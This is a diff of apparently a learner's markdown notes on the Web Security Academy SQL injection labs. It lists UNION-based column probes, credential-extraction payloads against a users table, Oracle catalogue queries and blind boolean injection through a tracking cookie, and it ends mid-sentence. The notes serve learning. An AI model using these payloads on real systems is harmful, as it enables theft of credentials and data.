@@ -37,19 +37,19 @@ For a `UNION` query to work, two key requirements must be met:
 
 To determine the number of columns required (to be submitted within the `WHERE` clause of the original query):
 
-`' ORDER BY 1-- `
+`' ORDER BY 1--`&#x20;
 
-`' ORDER BY 2-- `
+`' ORDER BY 2--`&#x20;
 
-`' ORDER BY 3-- `
+`' ORDER BY 3--`&#x20;
 
 `.....`
 
 **OR**
 
-`' UNION SELECT NULL-- `
+`' UNION SELECT NULL--`&#x20;
 
-`' UNION SELECT NULL,NULL-- `
+`' UNION SELECT NULL,NULL--`&#x20;
 
 `' UNION SELECT NULL,NULL,NULL--`
 
@@ -69,11 +69,11 @@ Modified:
 
 **Replace 'a' with string you are looking for:**
 
-`' UNION SELECT 'a',NULL,NULL,NULL-- `
+`' UNION SELECT 'a',NULL,NULL,NULL--`&#x20;
 
-`' UNION SELECT NULL,'a',NULL,NULL-- `
+`' UNION SELECT NULL,'a',NULL,NULL--`&#x20;
 
-`' UNION SELECT NULL,NULL,'a',NULL-- `
+`' UNION SELECT NULL,NULL,'a',NULL--`&#x20;
 
 `' UNION SELECT NULL,NULL,NULL,'a'--`
 
@@ -85,7 +85,7 @@ Modified:
 
 `https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,%27FgYUb0%27,NULL--`
 
-### Using an SQL injection UNION attack to retrieve interesting data <a href="using-an-sql-injection-union-attack-to-retrieve-interesting-data" id="using-an-sql-injection-union-attack-to-retrieve-interesting-data"></a>
+### Using an SQL injection UNION attack to retrieve interesting data <a href="#using-an-sql-injection-union-attack-to-retrieve-interesting-data" id="using-an-sql-injection-union-attack-to-retrieve-interesting-data"></a>
 
 The crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`
 
@@ -99,7 +99,7 @@ Modified:
 
 `ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories' UNION SELECT username, password FROM users--`
 
-### Retrieving multiple values within a single column <a href="retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>
+### Retrieving multiple values within a single column <a href="#retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>
 
 This example is for Oracle DBs:
 
@@ -115,7 +115,7 @@ Modified:
 
 `https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,username%20||%20%27~%27%20||%20password%20FROM%20users--`
 
-### Querying the database type and version <a href="querying-the-database-type-and-version" id="querying-the-database-type-and-version"></a>
+### Querying the database type and version <a href="#querying-the-database-type-and-version" id="querying-the-database-type-and-version"></a>
 
 | Database Type    | Query                     |
 | ---------------- | ------------------------- |
@@ -155,8 +155,26 @@ Find the names of the columns containing what you are looking for (usernames/pas
 
 `https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username_czehbi,+password_jwcmoz+FROM+users_ddvsxa--`
 
+### Equivalent to information schema on Oracle <a href="#equivalent-to-information-schema-on-oracle" id="equivalent-to-information-schema-on-oracle"></a>
 
+You can list tables by querying `all_tables`:
 
+`SELECT * FROM all_tables`
 
+And you can list columns by querying `all_tab_columns`:
 
-``
+`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
+
+### Blind SQL injection by triggering conditional responses
+
+Use `AND` to check if condition is inject-able:
+
+`…xyz' AND '1'='1 //True`
+
+`…xyz' AND '1'='2 //False`
+
+Based off the True and False above, you then give statements to test out what is available. To verify if there is a table called **users**, you would do the following:
+
+`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users LIMIT 1)='a;`
+
+Now you know the **users** table exists, if you get a similar response to True above. To check for a username
